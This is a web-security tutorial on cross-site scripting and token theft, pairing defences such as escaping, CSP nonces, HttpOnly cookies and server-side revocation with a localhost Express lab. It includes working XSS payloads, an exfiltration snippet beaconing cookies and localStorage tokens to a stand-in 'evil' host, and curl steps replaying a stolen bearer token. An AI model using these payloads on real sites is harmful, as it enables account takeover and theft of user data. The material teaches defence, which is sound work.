# 48. XSS & Token Theft

## Notes

### What is XSS?

**XSS (Cross-Site Scripting)** happens when an attacker gets **their JavaScript to run on your website**, inside your users' browsers. To the browser it looks like your own code, so it gets everything your code gets: the page, `localStorage`, non-`HttpOnly` cookies, and the right to call your API **as the logged-in user**.

Topic 25 asked "where should tokens live **if** XSS happens?" This topic is about **how XSS happens and how to stop it**, and what a stolen token is worth.

> **One-line answer:** XSS = untrusted text ends up in your page as **code**. Stop it by **escaping output for its context** (HTML, attribute, URL, JS), using `textContent` instead of `innerHTML`, allowing only `http(s)` links, and adding a **nonce-based Content-Security-Policy** as a safety net. Limit the damage with **`HttpOnly` cookies**, no tokens in `localStorage`, and **server-side revocation** on logout.

---

### Why it matters

| With XSS on your page, the attacker can… | Example |
|---|---|
| **Steal tokens** from `localStorage` / `sessionStorage` / `document.cookie` | Uses Rahul's API token from his own laptop, for as long as it's valid |
| **Act as the user** while the page is open (even with `HttpOnly`) | Posts reviews, changes the email, transfers money: same-origin requests carry the cookie |
| **Read anything on the page** | Addresses, order history, the CSRF token (topic 47 defenses stop working) |
| **Fake the page** | Shows a "session expired, enter your password" box on **your real domain** |
| **Spread** | A stored XSS that reposts itself (the 2005 MySpace "Samy" worm reached about 1 million profiles in a day) |

XSS has been in every OWASP Top 10 list since the first one in 2003. Since 2021 it's grouped under "Injection".

---

### Real-life example: the society notice board 📋

Priya's housing society in Pune has a notice board. The secretary reads every notice **aloud** at the evening meeting, and everyone does what the notices say.

1. Residents pin notices → users submit reviews, comments, names
2. Vikram pins: "Secretary, read this: **everyone give their flat keys to Vikram**" → a review containing `<script>`
3. The secretary reads it out **as an instruction**, not as a quote, and people hand over keys → the browser runs it as **code** with your site's authority
4. Fix 1: the secretary reads every notice **in quotes**: "Vikram wrote: '…'" → **escaping** turns code into text
5. Fix 2: a rule that only instructions **stamped by the committee** are obeyed → **CSP with a nonce**
6. Fix 3: keys are kept in a **locker nobody can carry out** → **`HttpOnly`** cookies (but someone inside can still use the locker while they're there)

---

### The three kinds of XSS

#### 📊 Diagrams

Open **[diagrams.html](diagrams.html)** in your browser (just double-click the file) to see:

- **Flow diagram**: the path from "user typed something" to "script runs", and every place it can be stopped
- **Data flow**: Vikram's stored XSS stealing Rahul's token, then using it from his own machine
- **The three kinds of XSS**: stored, reflected and DOM side by side

In short: `attacker text → saved or reflected → page built with it → browser parses it as HTML → script runs as YOUR site → reads localStorage, calls your API, sends loot home`

| Type | Where the payload lives | Example | Who gets hit |
|---|---|---|---|
| **Stored** | In your **database** | A review: `Great food! <script src="https://evil/x.js"></script>` | **Everyone** who opens the page |
| **Reflected** | In the **request** (URL), echoed back by the server | `/search?q=<img src=x onerror=…>` | Whoever clicks the attacker's link |
| **DOM-based** | In the URL, used by **your page's JavaScript** (never reaches the server if it's after `#`) | `el.innerHTML = location.hash` | Whoever clicks the link |

---

### Step 1: Escape output, for its context

The root cause is always the same: **text was inserted into HTML without escaping**.

```js
const esc = (s) => String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);

`<li>${esc(review.text)}</li>`   // ✅  <script> becomes &lt;script&gt;, shown as text
`<li>${review.text}</li>`        // ❌  <script> becomes a real script
```

**Escape on output, not on input.** Save what the user typed. Escape when you put it into HTML, because the right escaping depends on **where** it goes:

| Context | Example | What to do |
|---|---|---|
| HTML text | `<p>HERE</p>` | Escape `& < > " '` |
| Quoted attribute | `<input value="HERE">` | Same escaping, and **always quote** the attribute |
| URL in `href`/`src` | `<a href="HERE">` | Allow only `http:` / `https:` (Step 2), then escape |
| Inside `<script>` | `const name = "HERE";` | Avoid it. Put data in a `data-` attribute, or `JSON.stringify` and escape `<` as `<` |
| Event handler, `style`, unquoted attribute | `onclick="HERE"` | **Never** put user data here |

| ✅ Do | ❌ Don't |
|---|---|
| Use a template engine that **auto-escapes** (EJS `<%= %>`, Handlebars `{{ }}`, Pug, React JSX) | Turn auto-escaping off (`<%- %>`, `{{{ }}}`, `!{}` in Pug) for user data |
| In React, just render `{review.text}` | `dangerouslySetInnerHTML={{ __html: review.text }}` |
| Escape **every** value, even "safe" ones like a username | Escape only fields you think are risky |

---

### Step 2: Links are a context of their own

Escaping doesn't help here:

```html
<a href="javascript:alert(document.cookie)">website</a>   <!-- no < or > needed -->
```

```js
const safeUrl = (u) => {
  try { const url = new URL(u); return ["http:", "https:"].includes(url.protocol) ? url.href : null; } catch { return null; }
};
```

Allow-list `http:` and `https:` (and `mailto:` if you need it). Block-listing `javascript:` fails: `JaVaScRiPt:`, `java&#09;script:` and `data:text/html,…` all get through.

---

### Step 3: In the browser, use `textContent`, not `innerHTML`

DOM XSS is a **frontend** bug. The server can be perfect and the page still runs the attacker's code:

```js
el.innerHTML = "Welcome, " + decodeURIComponent(location.hash.slice(1));   // ❌ #<img src=x onerror=…> runs
el.textContent = "Welcome, " + decodeURIComponent(location.hash.slice(1)); // ✅ shown as text
```

Dangerous "sinks": `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`, `setTimeout("string")`, jQuery `$(html)` / `.html()`, `location = userInput`.

Need to show **user HTML** on purpose (a rich-text editor, Markdown)? Run it through a sanitizer like **DOMPurify** first, which keeps `<b>` and removes `<script>` and `onerror`. Never write your own HTML sanitizer with regex.

---

### Step 4: Content-Security-Policy, the safety net

Escaping fails when someone forgets it once. **CSP** is a response header that tells the browser which scripts may run:

```
Content-Security-Policy: default-src 'self'; script-src 'nonce-RSNbpVRzxHlD63qCq3hziw=='; style-src 'nonce-…';
  img-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'
```

```html
<script nonce="RSNbpVRzxHlD63qCq3hziw==">…our code…</script>   <!-- ✅ runs -->
<script src="https://evil/x.js"></script>                     <!-- ❌ no nonce: blocked -->
<img src=x onerror="steal()">                                  <!-- ❌ inline handler: blocked -->
```

| Directive | Why |
|---|---|
| `script-src 'nonce-…'` | A **new random nonce on every response**. Injected scripts can't know it. |
| `object-src 'none'`, `base-uri 'none'` | Close old tricks (Flash/plugins, `<base href>` hijacking script paths) |
| `img-src 'self'`, `connect-src 'self'` | Even a running script can't easily send loot to another server |
| `frame-ancestors 'none'` | No clickjacking (topic 47) |

| ✅ Do | ❌ Don't |
|---|---|
| Nonce-based (or hash-based) `script-src` | `'unsafe-inline'`: allows exactly what XSS injects |
| Start with `Content-Security-Policy-Report-Only` to find what breaks | `'unsafe-eval'`, or allow-listing a big CDN (attackers host scripts there too) |
| Treat CSP as **defense in depth** | Treat CSP as a replacement for escaping |

Our demo's `/csp-demo/reviews` page **forgets to escape**, and the browser still refuses Vikram's script: `Loading the script 'http://127.0.0.1:3049/x.js' violates the following Content Security Policy directive: "script-src 'nonce-…'"`.

---

### Step 5: Token theft, and limiting the damage

What the injected script does in our demo:

```js
const data = { documentCookie: document.cookie, apiToken: localStorage.getItem("apiToken") };
new Image().src = "https://evil/collect?d=" + encodeURIComponent(JSON.stringify(data)); // an <img> needs no CORS
await fetch("/reviews", { method: "POST", body: … });  // acts as the user; the HttpOnly cookie is attached
```

What it got from Rahul's browser (real output):

| Thing | Stolen? | Worth to Vikram |
|---|---|---|
| `apiToken` in `localStorage` | ✅ `"Ew0oYhoq…"` | Works from **his own laptop** (`Authorization: Bearer …`) until it expires or is revoked |
| `sid` cookie (`HttpOnly`) | ❌ `documentCookie: ""` | Nothing to carry away |
| "Post a review as Rahul" | ✅ done | Works anyway: the script runs **inside** Rahul's page |

So:

- **`HttpOnly`** turns "attacker owns the account for days" into "attacker can act **while the tab is open**". Always use it for session and refresh tokens (topics 10, 25).
- **No long-lived tokens in `localStorage`/`sessionStorage`**. Use `HttpOnly` cookies, or memory + an `HttpOnly` refresh cookie (topic 25).
- **Revoke on the server.** On logout, password change or suspicious activity, delete sessions **and** tokens. In our demo the stolen token stops working the moment Rahul logs out. Short-lived JWTs that can't be revoked keep working (topic 24).
- **Bind tokens** to a device where possible (DPoP, mTLS: Level 8) so a copied token is useless elsewhere.
- **Re-ask for the password / passkey** before dangerous actions (step-up auth, topic 45). A script can't type Rahul's password.

---

### 🤔 Tricky parts

**1. "We sanitize on input" isn't enough.** The same data may later land in HTML, an attribute, a URL, a JS string, a CSV or an email. Each needs different escaping. Validate input (length, format), **escape on output**.

**2. `innerHTML` doesn't run `<script>` tags, so people think it's safe.** It does run `<img onerror>`, `<svg onload>`, `<iframe src="javascript:…">` and many more.

**3. JSON APIs can cause XSS too.** If an API returns user data with `Content-Type: text/html` (or no type and the browser sniffs), opening it directly renders it. Send `application/json` and `X-Content-Type-Options: nosniff`.

**4. Uploaded files.** An uploaded `.html` or `.svg` served from your domain is stored XSS. Serve uploads from a **separate domain** (like `usercontent.example`) with `Content-Disposition: attachment`.

**5. Third-party scripts are XSS you invited.** An analytics or chat widget runs with full access. A compromised CDN = XSS on every page. Use few of them, pin versions, and use Subresource Integrity (`integrity="sha384-…"`).

**6. XSS beats CSRF defenses.** The script is same-origin: it can read the CSRF token from the page and send it (topic 47).

**7. Admin panels.** Stored XSS often fires in an **admin** page that shows user-submitted data (support tickets, names). Now the script runs with admin rights. Escape there too.

---

### Common beginner mistakes

1. **Building HTML with string concatenation and no escaping.**
   Use a template engine with auto-escaping, or escape every value.

2. **Using `innerHTML` for text.**
   Use `textContent`. Use DOMPurify only when you really need HTML.

3. **Turning off auto-escaping** (`<%-`, `{{{ }}}`, `dangerouslySetInnerHTML`) for user content.

4. **Escaping but forgetting URLs.**
   `javascript:` links need a protocol allow-list.

5. **Writing your own HTML sanitizer with regex.**
   Browsers parse HTML in surprising ways. Use DOMPurify.

6. **Storing tokens in `localStorage`.**
   One XSS and the token leaves the building.

7. **CSP with `'unsafe-inline'`.**
   It allows exactly the inline scripts and handlers an attacker injects.

8. **Logout that only deletes the cookie in the browser.**
   A stolen copy keeps working. Revoke on the server.

9. **Trusting data from your own database.**
   It was typed by users. Stored XSS lives there.

10. **Only escaping on the "public" pages.**
    Admin and internal tools show the same data.

---

### Interview questions

1. **What is XSS and what are its types?**
   Injecting script that runs in other users' browsers in the context of your site. **Stored** (saved in the DB, shown to everyone), **reflected** (in the request, echoed back), **DOM-based** (the page's own JS puts URL data into the DOM).

2. **How do you prevent XSS?**
   Context-aware output escaping (auto-escaping templates), `textContent` instead of `innerHTML`, a protocol allow-list for URLs, DOMPurify for rich HTML, and a nonce-based CSP as a second layer.

3. **Does `HttpOnly` prevent XSS?**
   No. It stops the script from **reading** the cookie, so the session can't be stolen and reused elsewhere. The script can still make requests as the user while the page is open.

4. **Why is storing a JWT in `localStorage` risky?**
   Any script on the origin can read it. With XSS, the attacker copies it and uses it from anywhere until it expires.

5. **What is CSP and how does a nonce work?**
   A response header listing what the page may load and run. With `script-src 'nonce-abc'`, only `<script nonce="abc">` tags run. The nonce is random per response, so injected scripts can't include it. Inline handlers like `onerror` are blocked too.

6. **Should you escape on input or on output?**
   Output. The correct escaping depends on where the data ends up. Validate input for format and length.

7. **What's the difference between XSS and CSRF?**
   CSRF makes the browser **send** a request from another site and can't read anything. XSS runs code **on your site** and can read and send anything. XSS defeats CSRF tokens.

8. **An attacker stole a user's token. What do you do?**
   Revoke it server-side (and the user's sessions and refresh tokens), find and fix the XSS, rotate anything else exposed, and alert the user (topic 55). Short-lived access tokens and refresh-token rotation (topic 23) limit how long a stolen token works.

---

### Quick recap

- XSS = **attacker's script runs as your site**: stored, reflected, DOM
- **Escape on output**, for the context: HTML text, attribute, URL (`http(s)` only), never inside handlers
- Frontend: **`textContent`**, not `innerHTML`; **DOMPurify** for real HTML
- **CSP with a per-response nonce**, no `'unsafe-inline'`: blocks injected scripts even when escaping was forgotten
- **`HttpOnly`** cookies can't be stolen, but XSS can still **use** them while the tab is open
- **No tokens in `localStorage`**; **revoke** sessions and tokens on the server at logout
- XSS breaks CSRF defenses (topic 47); CORS is next (topic 49)

## Code

A small **Express** app with **two servers in one file**: **KhaanaReview**, a restaurant-review site (on `PORT`), and **Vikram's server** (on `PORT + 1`), which hosts his evil script `x.js` and collects stolen data at `/loot`. Every page comes in a safe and a vulnerable version, so you can watch the same payload run, or not:

| Page | Escaping | CSP |
|---|---|---|
| `/reviews` | ✅ | ✅ |
| `/csp-demo/reviews` | ❌ (a "forgotten" escape) | ✅ |
| `/vulnerable/reviews` | ❌ | ❌ |
| `/search` vs `/vulnerable/search` | reflected XSS | |
| `/welcome` vs `/vulnerable/welcome` | DOM XSS (`textContent` vs `innerHTML`) | |

At login the page puts an API token in `localStorage` (the bad habit from topic 25), so there's something to steal. The session cookie is `HttpOnly`. Everything is in memory, so a restart resets it.

📄 **Full code: [server.js](server.js)**. Open it and read the comments, which follow the same steps as the notes above.

Install Express once (from this folder), then start the server:

```bash
npm install
```

```bash
node server.js
```

> Port 3000 busy? Run it on another port: `PORT=3048 node server.js` (Git Bash). Vikram's server then runs on 3049. The outputs below were recorded on port 3048.

### Try it with curl (Git Bash): Vikram plants the payload

```bash
APP=http://localhost:3048
```

😈 **① Vikram logs in** and gets his own session.

```bash
curl -s -c vikram.jar $APP/login -H "Content-Type: application/json" -d '{"email":"vikram@mail.com","password":"vikram-pass-99"}'
```
→ `{"message":"Logged in as vikram@mail.com","apiToken":"aecdtRK15VWIHxGAKIzbl2jHuEPlTX_llDKQ4NmTANs"}`

😈 **② He posts a review with a script in it** (stored XSS), and one with a `javascript:` link:

```bash
curl -s -b vikram.jar $APP/reviews -H "Content-Type: application/json" -d '{"text":"Great food! <script src=\"http://127.0.0.1:3049/x.js\"></script>"}'
curl -s -b vikram.jar $APP/reviews -H "Content-Type: application/json" -d '{"text":"See the menu","website":"javascript:alert(document.cookie)"}'
```
→ `{"id":1,"author":"vikram@mail.com","text":"Great food! <script src=\"http://127.0.0.1:3049/x.js\"></script>",...}` and `{"id":2,...,"website":"javascript:alert(document.cookie)",...}`. Saved exactly as typed.

❌ **③ The vulnerable page** puts it straight into the HTML:

```bash
curl -s $APP/vulnerable/reviews | grep -o "<li>.*</li>"
```
→
```html
<li><b>vikram@mail.com</b>: Great food! <script src="http://127.0.0.1:3049/x.js"></script></li><li><b>vikram@mail.com</b>: See the menu <a href="javascript:alert(document.cookie)">website</a></li>
```

✅ **④ The safe page** escapes the text and drops the `javascript:` link:

```bash
curl -s $APP/reviews | grep -o "<li>.*</li>"
```
→
```html
<li><b>vikram@mail.com</b>: Great food! &lt;script src=&quot;http://127.0.0.1:3049/x.js&quot;&gt;&lt;/script&gt;</li><li><b>vikram@mail.com</b>: See the menu</li>
```

🛡️ **⑤ The safe pages send a CSP** (the vulnerable ones don't):

```bash
curl -s -i $APP/reviews | grep -i "content-security\|x-content"
```
→
```
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'; script-src 'nonce-RSNbpVRzxHlD63qCq3hziw=='; style-src 'nonce-RSNbpVRzxHlD63qCq3hziw=='; img-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'
```

🪞 **⑥ Reflected XSS:** the search term comes back in the page.

```bash
curl -s "$APP/vulnerable/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" | grep -o "<p.*</p>"
curl -s "$APP/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" | grep -o "<p.*</p>"
```
→
```html
<p class="bad">0 result(s) for <b><img src=x onerror=alert(1)></b></p>
<p>0 result(s) for <b>&lt;img src=x onerror=alert(1)&gt;</b></p>
```

### Try it in the browser: Rahul gets hit

curl can't run JavaScript, so this part needs a browser.

1. Open **http://localhost:3048** and log in as **rahul@mail.com** / **chai-and-code-42**. The home page shows the API token it put in `localStorage`.
2. Open **/csp-demo/reviews**. The review isn't escaped, but the DevTools console says: `Loading the script 'http://127.0.0.1:3049/x.js' violates the following Content Security Policy directive: "script-src 'nonce-…'" … The action has been blocked.`
3. Open **/vulnerable/reviews**. Nothing visible happens… but Vikram's terminal prints:
   ```
   🕵️  Stolen: {"page":"http://localhost:3048/vulnerable/reviews","documentCookie":"","apiToken":"Ew0oYhoqS6QQngffSQoaACEuWyr6isoZB7Rasns37kE"}
   ```
   `documentCookie` is **empty** (the `sid` cookie is `HttpOnly`), but the `localStorage` token is gone.
4. Open **/reviews**. There's a new review **by Rahul** that he never wrote: `rahul@mail.com: Vikram's Biryani House is the best in Hyderabad! 5 stars`. The script used Rahul's `HttpOnly` cookie without reading it.
5. DOM and reflected XSS: open these and look at the tab title.

| URL | Tab title |
|---|---|
| `/vulnerable/welcome#<img src=x onerror="document.title='XSS ran'">` | **XSS ran** ❌ (`innerHTML`) |
| `/welcome#<img src=x onerror="document.title='XSS ran'">` | Welcome ✅ (shown as text with `textContent`) |
| `/vulnerable/search?q=<img src=x onerror="document.title='XSS ran'">` | **XSS ran** ❌ |
| `/search?q=<img src=x onerror="document.title='XSS ran'">` | Search ✅ |

### Back to curl: Vikram uses the stolen token

🕵️ **⑦ What did the script send home?**

```bash
curl -s http://127.0.0.1:3049/loot
```
→ `[{"at":"2026-11-06T01:40:29.373Z","data":"{\"page\":\"http://localhost:3048/vulnerable/reviews\",\"documentCookie\":\"\",\"apiToken\":\"Ew0oYhoqS6QQngffSQoaACEuWyr6isoZB7Rasns37kE\"}"}]`

😱 **⑧ Vikram is now Rahul**, from his own machine:

```bash
TOKEN=PASTE_THE_STOLEN_TOKEN_HERE
curl -s $APP/api/me -H "Authorization: Bearer $TOKEN"
```
→ `{"email":"rahul@mail.com","via":"Bearer token","myReviews":1}`

👋 **⑨ Rahul presses Log out in the browser.** The server revokes his API tokens too, so the stolen copy dies:

```bash
curl -s $APP/api/me -H "Authorization: Bearer $TOKEN"
```
→ `{"error":"Not signed in"}`

> **Windows PowerShell users:** the single quotes in `-d '...'` and `VAR=value node ...` work in Git Bash. In PowerShell, use Git Bash or Postman, or set the port with `$env:PORT=3048; node server.js`. Restart the server to clear the reviews and the loot.
